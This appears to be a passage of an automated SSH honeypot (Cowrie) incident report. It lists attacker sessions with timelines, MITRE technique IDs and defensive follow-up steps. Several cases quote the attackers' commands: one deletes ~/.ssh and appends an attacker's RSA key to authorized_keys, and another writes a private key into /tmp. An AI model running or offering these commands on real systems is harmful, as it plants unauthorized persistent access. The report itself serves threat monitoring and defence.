| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-17 02:31:34` | `cowrie.session.connect` |
| `2026-10-17 02:31:34` | `cowrie.client.version` |
| `2026-10-17 02:31:35` | `cowrie.client.kex` |
| `2026-10-17 02:31:36` | `cowrie.login.success` |
| `2026-10-17 02:31:37` | `cowrie.session.params` |
| `2026-10-17 02:31:37` | `cowrie.command.input` |
| `2026-10-17 02:31:37` | `cowrie.command.failed` |
| `2026-10-17 02:31:37` | `cowrie.log.closed` |
| `2026-10-17 02:31:38` | `cowrie.session.params` |
| `2026-10-17 02:31:38` | `cowrie.command.input` |
| `2026-10-17 02:31:38` | `cowrie.session.file_download` |
| `2026-10-17 02:31:38` | `cowrie.log.closed` |
| `2026-10-17 02:31:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.172.20[.]218` to AbuseIPDB if not already reported
- [ ] Block `103.172.20[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-62863da8171c

| Field | Detail |
|---|---|
| **Source IP** | `103.172.20[.]218` |
| **First Seen** | 2026-10-17 02:31 |
| **Last Seen** | 2026-10-17 02:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-17 02:31:38` | `cowrie.session.connect` |
| `2026-10-17 02:31:38` | `cowrie.client.version` |
| `2026-10-17 02:31:39` | `cowrie.client.kex` |
| `2026-10-17 02:31:40` | `cowrie.login.success` |
| `2026-10-17 02:31:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.172.20[.]218` to AbuseIPDB if not already reported
- [ ] Block `103.172.20[.]218` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-542ed48350ef

| Field | Detail |
|---|---|
| **Source IP** | `34.62.153[.]93` |
| **First Seen** | 2026-10-17 02:32 |
| **Last Seen** | 2026-10-17 02:32 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-17 02:32:07` | `cowrie.session.connect` |
| `2026-10-17 02:32:07` | `cowrie.client.version` |
| `2026-10-17 02:32:07` | `cowrie.client.kex` |
| `2026-10-17 02:32:09` | `cowrie.login.success` |
| `2026-10-17 02:32:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.62.153[.]93` to AbuseIPDB if not already reported
- [ ] Block `34.62.153[.]93` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a46bf05cdc7

| Field | Detail |
|---|---|
| **Source IP** | `103.160.205[.]37` |
| **First Seen** | 2026-10-17 02:36 |
| **Last Seen** | 2026-10-17 02:36 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-17 02:36:28` | `cowrie.session.connect` |
| `2026-10-17 02:36:28` | `cowrie.client.version` |
| `2026-10-17 02:36:29` | `cowrie.client.kex` |
| `2026-10-17 02:36:31` | `cowrie.login.success` |
| `2026-10-17 02:36:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.160.205[.]37` to AbuseIPDB if not already reported
- [ ] Block `103.160.205[.]37` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ae048d7c353

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-10-17 02:36 |
| **Last Seen** | 2026-10-17 02:36 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; cd /tmp || cd /var/tmp || cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----; b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW; QyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxgAAAJAt8FDRLfBQ; 0QAAAAtzc2gtZWQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg; AAAEAr1wl+3JHkjA3ZtPtjd8bAtLVFo13eZ12Aw2QnFXC/ie94S34m0hVkYFUhtWQe92S9; Cp0yJp+7n8gw696Uf/LGAAAACGRsckBzZnRwAQIDBAU=; -----END OPENSSH PRIVATE KEY-----' > key.p` |
| **Download Attempts** | 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca, ae8d459595257f2f22c9d1ff74c4fb8a91643fad7899b57556496716692b904e |
| **Malware Analysis** | 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-17 02:36:32` | `cowrie.session.connect` |
| `2026-10-17 02:36:32` | `cowrie.client.version` |
| `2026-10-17 02:36:33` | `cowrie.client.kex` |
| `2026-10-17 02:36:33` | `cowrie.login.success` |
| `2026-10-17 02:36:34` | `cowrie.session.params` |
| `2026-10-17 02:36:34` | `cowrie.command.input` |
| `2026-10-17 02:36:35` | `cowrie.session.file_download` |
| `2026-10-17 02:36:35` | `cowrie.session.file_download` |
| `2026-10-17 02:36:35` | `cowrie.log.closed` |
| `2026-10-17 02:36:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f92d8ff7b024

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-10-17 02:50 |
| **Last Seen** | 2026-10-17 02:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-17 02:50:30` | `cowrie.session.connect` |
| `2026-10-17 02:50:30` | `cowrie.client.version` |
| `2026-10-17 02:50:30` | `cowrie.client.kex` |
| `2026-10-17 02:50:30` | `cowrie.login.success` |
| `2026-10-17 02:50:30` | `cowrie.direct-tcpip.request` |
| `2026-10-17 02:50:30` | `cowrie.direct-tcpip.data` |
| `2026-10-17 02:50:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e04bbb934d0

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]31` |
| **First Seen** | 2026-10-17 02:53 |
| **Last Seen** | 2026-10-17 02:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-17 02:53:53` | `cowrie.session.connect` |
| `2026-10-17 02:53:53` | `cowrie.client.version` |
| `2026-10-17 02:53:53` | `cowrie.client.kex` |
| `2026-10-17 02:53:53` | `cowrie.login.success` |
| `2026-10-17 02:53:54` | `cowrie.session.params` |
| `2026-10-17 02:53:54` | `cowrie.command.input` |
| `2026-10-17 02:53:54` | `cowrie.log.closed` |
| `2026-10-17 02:53:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]31` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]31` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e316d73c6acc

| Field | Detail |
|---|---|
| **Source IP** | `137.74.114[.]131` |
| **First Seen** | 2026-10-17 03:03 |
| **Last Seen** | 2026-10-17 03:03 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-17 03:03:39` | `cowrie.session.connect` |
| `2026-10-17 03:03:39` | `cowrie.client.version` |
| `2026-10-17 03:03:39` | `cowrie.client.kex` |
| `2026-10-17 03:03:40` | `cowrie.login.success` |
| `2026-10-17 03:03:40` | `cowrie.session.params` |
| `2026-10-17 03:03:40` | `cowrie.command.input` |
| `2026-10-17 03:03:40` | `cowrie.command.failed` |
| `2026-10-17 03:03:41` | `cowrie.log.closed` |
| `2026-10-17 03:03:41` | `cowrie.session.params` |
| `2026-10-17 03:03:41` | `cowrie.command.input` |
| `2026-10-17 03:03:41` | `cowrie.session.file_download` |
| `2026-10-17 03:03:41` | `cowrie.log.closed` |
| `2026-10-17 03:03:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `137.74.114[.]131` to AbuseIPDB if not already reported
- [ ] Block `137.74.114[.]131` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f3c186263ceb

| Field | Detail |
|---|---|
| **Source IP** | `137.74.114[.]131` |
| **First Seen** | 2026-10-17 03:03 |
| **Last Seen** | 2026-10-17 03:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-17 03:03:42` | `cowrie.session.connect` |
| `2026-10-17 03:03:42` | `cowrie.client.version` |
| `2026-10-17 03:03:42` | `cowrie.client.kex` |
| `2026-10-17 03:03:43` | `cowrie.login.success` |
| `2026-10-17 03:03:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `137.74.114[.]131` to AbuseIPDB if not already reported
- [ ] Block `137.74.114[.]131` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-273ccbb6757a

| Field | Detail |
|---|---|
| **Source IP** | `129.121.78[.]234` |
| **First Seen** | 2026-10-17 03:04 |
| **Last Seen** | 2026-10-17 03:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-17 03:04:16` | `cowrie.session.connect` |
| `2026-10-17 03:04:16` | `cowrie.client.version` |
| `2026-10-17 03:04:16` | `cowrie.client.kex` |
| `2026-10-17 03:04:17` | `cowrie.login.success` |
| `2026-10-17 03:04:17` | `cowrie.session.params` |
| `2026-10-17 03:04:17` | `cowrie.command.input` |
| `2026-10-17 03:04:17` | `cowrie.command.failed` |
| `2026-10-17 03:04:17` | `cowrie.log.closed` |
| `2026-10-17 03:04:18` | `cowrie.session.params` |
| `2026-10-17 03:04:18` | `cowrie.command.input` |
| `2026-10-17 03:04:18` | `cowrie.session.file_download` |
| `2026-10-17 03:04:18` | `cowrie.log.closed` |
| `2026-10-17 03:04:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.121.78[.]234` to AbuseIPDB if not already reported
- [ ] Block `129.121.78[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cee790cc5312

| Field | Detail |
|---|---|
| **Source IP** | `129.121.78[.]234` |
| **First Seen** | 2026-10-17 03:04 |
| **Last Seen** | 2026-10-17 03:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-17 03:04:18` | `cowrie.session.connect` |
| `2026-10-17 03:04:18` | `cowrie.client.version` |
| `2026-10-17 03:04:18` | `cowrie.client.kex` |
| `2026-10-17 03:04:18` | `cowrie.login.success` |
| `2026-10-17 03:04:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.121.78[.]234` to AbuseIPDB if not already reported
- [ ] Block `129.121.78[.]234` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95420587fa6d

| Field | Detail |
|---|---|
| **Source IP** | `129.121.140[.]234` |
| **First Seen** | 2026-10-17 03:05 |
| **Last Seen** | 2026-10-17 03:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-17 03:05:31` | `cowrie.session.connect` |
| `2026-10-17 03:05:31` | `cowrie.client.version` |
| `2026-10-17 03:05:31` | `cowrie.client.kex` |
| `2026-10-17 03:05:31` | `cowrie.login.success` |
| `2026-10-17 03:05:31` | `cowrie.session.params` |
| `2026-10-17 03:05:31` | `cowrie.command.input` |
| `2026-10-17 03:05:31` | `cowrie.command.failed` |
| `2026-10-17 03:05:31` | `cowrie.log.closed` |
| `2026-10-17 03:05:32` | `cowrie.session.params` |
| `2026-10-17 03:05:32` | `cowrie.command.input` |
| `2026-10-17 03:05:32` | `cowrie.session.file_download` |
| `2026-10-17 03:05:32` | `cowrie.log.closed` |
| `2026-10-17 03:05:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.121.140[.]234` to AbuseIPDB if not already reported
- [ ] Block `129.121.140[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-76cb76353042

| Field | Detail |
|---|---|
| **Source IP** | `129.121.140[.]234` |
| **First Seen** | 2026-10-17 03:05 |
| **Last Seen** | 2026-10-17 03:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-17 03:05:32` | `cowrie.session.connect` |
| `2026-10-17 03:05:32` | `cowrie.client.version` |
| `2026-10-17 03:05:32` | `cowrie.client.kex` |
| `2026-10-17 03:05:32` | `cowrie.login.success` |
| `2026-10-17 03:05:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.121.140[.]234` to AbuseIPDB if not already reported
- [ ] Block `129.121.140[.]234` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### Additional priority cases (101) — compact view

| Case | Severity | Source IP | First Seen | Auth | Cmds | DL | TTPs |
|---|---|---|---|---|---|---|---|
| IR-0f6aa38228d0 | HIGH | `172.211.56[.]214` | 2026-10-17 03:25 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-c0935333cbda | HIGH | `172.211.56[.]214` | 2026-10-17 03:25 | Y | 0 | 0 | `T1078 · T1592` |
| IR-5abc121d3f49 | HIGH | `211.106.133[.]202` | 2026-10-17 03:30 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-1fa92233f190 | HIGH | `211.106.133[.]202` | 2026-10-17 03:30 | Y | 0 | 0 | `T1078 · T1592` |
| IR-a8817730cced | HIGH | `92.118.39[.]14` | 2026-10-17 04:08 | Y | 10 | 0 | `T1059.004 · T1078 · T1083` |
| IR-99613d40e2ed | HIGH | `193.112.192[.]91` | 2026-10-17 04:09 | Y | 1 | 0 | `T1078 · T1592` |
| IR-f744daeeeee5 | HIGH | `176.53.159[.]196` | 2026-10-17 04:12 | Y | 0 | 0 | `T1078 · T1592` |
| IR-64896cbf8f9d | HIGH | `36.75.4[.]115` | 2026-10-17 04:13 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-95b78e524910 | HIGH | `36.75.4[.]115` | 2026-10-17 04:13 | Y | 0 | 0 | `T1078 · T1592` |
| IR-84ecf07b6aef | HIGH | `109.160.32[.]141` | 2026-10-17 04:23 | Y | 1 | 0 | `T1078 · T1592` |
| IR-4ae84be8bacd | HIGH | `65.49.1[.]232` | 2026-10-17 04:40 | Y | 3 | 0 | `T1078` |
| IR-9e5a7a596fd8 | HIGH | `111.33.77[.]210` | 2026-10-17 04:56 | Y | 0 | 0 | `T1078 · T1592` |
| IR-bc29c98ecf2c | HIGH | `156.236.66[.]15` | 2026-10-17 05:18 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-eeaec36703a2 | HIGH | `156.236.66[.]15` | 2026-10-17 05:18 | Y | 0 | 0 | `T1078 · T1592` |
| IR-bc981d939d5b | HIGH | `43.228.157[.]232` | 2026-10-17 05:27 | Y | 0 | 0 | `T1078 · T1592` |
| IR-020c897c8886 | HIGH | `109.160.32[.]110` | 2026-10-17 06:21 | Y | 1 | 0 | `T1078 · T1592` |
| IR-5e20ca08828d | HIGH | `176.53.159[.]196` | 2026-10-17 06:32 | Y | 0 | 0 | `T1078 · T1592` |
| IR-290dac5e5568 | HIGH | `172.236.228[.]208` | 2026-10-17 06:40 | Y | 3 | 0 | `T1078` |
| IR-5aed42756581 | HIGH | `50.114.236[.]142` | 2026-10-17 06:47 | Y | 0 | 0 | `T1078 · T1592` |
| IR-bf0ed66fbda7 | HIGH | `130.12.180[.]51` | 2026-10-17 06:47 | Y | 1 | 2 | `T1021.004 · T1059.004 · T1078` |
| IR-c3c947f7f6a8 | HIGH | `163.223.210[.]138` | 2026-10-17 07:08 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-6821d4739d23 | HIGH | `163.223.210[.]138` | 2026-10-17 07:09 | Y | 0 | 0 | `T1078 · T1592` |
| IR-eeefea62f040 | HIGH | `109.160.32[.]49` | 2026-10-17 07:09 | Y | 1 | 0 | `T1078 · T1592` |
| IR-051c38f56a05 | HIGH | `132.145.122[.]251` | 2026-10-17 07:09 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-091995227ae8 | HIGH | `132.145.122[.]251` | 2026-10-17 07:09 | Y | 0 | 0 | `T1078 · T1592` |
| IR-45ede7fa0f78 | HIGH | `35.210.61[.]208` | 2026-10-17 07:31 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-c76f2ec5bc0d | HIGH | `35.210.61[.]208` | 2026-10-17 07:31 | Y | 0 | 0 | `T1078 · T1592` |
| IR-bdf284c7d353 | HIGH | `109.160.32[.]49` | 2026-10-17 08:00 | Y | 1 | 0 | `T1078 · T1592` |
| IR-21adb393a39e | HIGH | `109.160.32[.]106` | 2026-10-17 08:24 | Y | 1 | 0 | `T1078 · T1592` |
| IR-17e4c116ba7f | HIGH | `52.237.80[.]79` | 2026-10-17 08:25 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-32e9eb5a6d2f | HIGH | `52.237.80[.]79` | 2026-10-17 08:25 | Y | 0 | 0 | `T1078 · T1592` |
| IR-4746c34d46be | HIGH | `45.33.90[.]118` | 2026-10-17 08:32 | Y | 3 | 0 | `T1078` |
| IR-c7bb26d48d1a | HIGH | `8.216.3[.]89` | 2026-10-17 08:42 | Y | 2 | 0 | `T1078 · T1105` |
| IR-2275c8d03237 | HIGH | `176.53.159[.]196` | 2026-10-17 08:56 | Y | 0 | 0 | `T1078 · T1592` |
| IR-ed8291095d2e | HIGH | `45.169.200[.]254` | 2026-10-17 09:00 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-80111bd44841 | HIGH | `45.169.200[.]254` | 2026-10-17 09:00 | Y | 0 | 0 | `T1078 · T1592` |
| IR-718882737c2d | HIGH | `146.148.14[.]215` | 2026-10-17 09:01 | Y | 2 | 0 | `T1078` |
| IR-8b1490d4315b | HIGH | `146.148.14[.]215` | 2026-10-17 09:02 | Y | 1 | 0 | `T1078` |
| IR-d6e55fc38047 | HIGH | `146.148.14[.]215` | 2026-10-17 09:02 | Y | 0 | 0 | `T1078` |
| IR-53bc03a42f01 | HIGH | `115.68.208[.]117` | 2026-10-17 09:08 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-d6c921abe940 | HIGH | `115.68.208[.]117` | 2026-10-17 09:08 | Y | 0 | 0 | `T1078 · T1592` |
| IR-59e5c356ec81 | HIGH | `189.217.130[.]86` | 2026-10-17 09:12 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-e6d7b90fd6ef | HIGH | `189.217.130[.]86` | 2026-10-17 09:12 | Y | 0 | 0 | `T1078 · T1592` |
| IR-996409c51ca1 | HIGH | `43.128.3[.]201` | 2026-10-17 09:13 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-82c144cf0c68 | HIGH | `172.173.200[.]62` | 2026-10-17 09:13 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-70434314583f | HIGH | `172.173.200[.]62` | 2026-10-17 09:13 | Y | 0 | 0 | `T1078 · T1592` |
| IR-bdd2427922ba | HIGH | `43.128.3[.]201` | 2026-10-17 09:13 | Y | 0 | 0 | `T1078 · T1592` |
| IR-d21880858126 | HIGH | `151.59.152[.]58` | 2026-10-17 09:13 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-dd3961800760 | HIGH | `151.59.152[.]58` | 2026-10-17 09:13 | Y | 0 | 0 | `T1078 · T1592` |
| IR-4e5c2feb445f | HIGH | `118.196.119[.]108` | 2026-10-17 09:14 | Y | 1 | 0 | `T1021.004 · T1078 · T1592` |
| IR-e79d00caba9c | HIGH | `118.196.119[.]108` | 2026-10-17 09:14 | Y | 0 | 0 | `T1078 · T1592` |
| IR-a8990850707d | HIGH | `34.140.136[.]182` | 2026-10-17 09:15 | Y | 2 | 0 | `T1078` |
| IR-307467896fce | HIGH | `34.140.136[.]182` | 2026-10-17 09:15 | Y | 1 | 0 | `T1078` |
| IR-f58f5b3404dc | HIGH | `34.140.136[.]182` | 2026-10-17 09:15 | Y | 0 | 0 | `T1078` |
| IR-8b6853724580 | HIGH | `201.92.186[.]12` | 2026-10-17 09:25 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-07b71ffe44af | HIGH | `201.92.186[.]12` | 2026-10-17 09:25 | Y | 0 | 0 | `T1078 · T1592` |
| IR-296579667c14 | HIGH | `176.109.80[.]6` | 2026-10-17 09:28 | Y | 0 | 0 | `T1078 · T1105 · T1592` |
| IR-2f0bd986cc30 | HIGH | `41.216.177[.]55` | 2026-10-17 09:30 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-7bf904975847 | HIGH | `41.216.177[.]55` | 2026-10-17 09:30 | Y | 0 | 0 | `T1078 · T1592` |
| IR-e8f17ef4547f | HIGH | `87.106.63[.]76` | 2026-10-17 09:32 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-73c933253ce7 | HIGH | `87.106.63[.]76` | 2026-10-17 09:32 | Y | 0 | 0 | `T1078 · T1592` |
| IR-946e79a31b25 | HIGH | `125.212.251[.]7` | 2026-10-17 09:32 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-85405c9a6335 | HIGH | `125.212.251[.]7` | 2026-10-17 09:32 | Y | 0 | 0 | `T1078 · T1592` |
| IR-abd774c19640 | HIGH | `34.79.143[.]194` | 2026-10-17 09:37 | Y | 2 | 0 | `T1078` |
| IR-502b28a09dc2 | HIGH | `34.79.143[.]194` | 2026-10-17 09:37 | Y | 0 | 0 | `T1078` |
| IR-ecc6658084d4 | HIGH | `34.79.143[.]194` | 2026-10-17 09:37 | Y | 1 | 0 | `T1078` |
| IR-4986258dd8f9 | HIGH | `103.23.95[.]99` | 2026-10-17 09:54 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-3bcd532f76df | HIGH | `103.23.95[.]99` | 2026-10-17 09:54 | Y | 0 | 0 | `T1078 · T1592` |
| IR-8783e5f5baa9 | HIGH | `113.117.150[.]241` | 2026-10-17 09:55 | Y | 1 | 0 | `T1021.004 · T1078 · T1592` |
